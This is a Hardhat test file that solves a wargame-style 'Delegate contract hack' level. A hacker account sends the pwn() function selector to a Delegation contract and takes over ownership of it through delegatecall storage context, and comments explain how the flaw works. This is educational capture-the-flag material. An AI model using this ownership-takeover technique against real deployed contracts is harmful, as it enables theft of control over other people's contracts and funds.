import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 06 - Delegate contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const DelegateContract = await ethers.getContractFactory("Delegate");
        const DelegationContract = await ethers.getContractFactory("Delegation");

        const delegate = await DelegateContract.deploy(owner.address);
        const delegation = await DelegationContract.deploy(await delegate.getAddress());

        return {owner, hacker, delegation, delegate};
    };

    describe("When deploying", () => {
        it("Delegation owner should match the delegate deployer", async() => {
            const {owner, hacker, delegation, delegate} = await loadFixture(setUp);
            expect(await delegation.owner()).to.equal(owner.address);
            expect(await delegate.owner()).to.equal(owner.address);
        });
    });
    
    describe("When hacking", () => {
        it("Hacker should own the delegation contract after passing the pwn() function signature as the callback message data", async() => {
            /*
             * The delegatecall low level function executes the delegate's called function logic within the Delegation context.
             * This means the storage slots that are modified after the delegate contract function execution are the ones in the Delegation contract.
             * 
             * By triggering the Delegation's forward function and providing the pwn() method as the msg data,
             * the owner is actually modified in the Delegation contract.
             * That way, the hacker can claim ownership of the Delegation contract.
             * 
             * Note: two ways on how to compute the function's signature using ethers.js:
             * 
             * 1. const pwnSignature = (ethers.id("pwn()")).substring(0,10);
             * 
             * 2. let abi = ["function pwn()"];
             *    let iface = new ethers.Interface(abi);
             *    const pwnSignature = iface.encodeFunctionData("pwn");              
            **/
            const {owner, hacker, delegation, delegate} = await loadFixture(setUp);
            expect(await delegation.owner()).to.equal(owner.address);

            const pwnSignature = (ethers.id("pwn()")).substring(0,10);

            await hacker.sendTransaction({to: await delegation.getAddress(), data: pwnSignature});
            expect(await delegation.owner()).to.equal(hacker.address);
        });
    });
});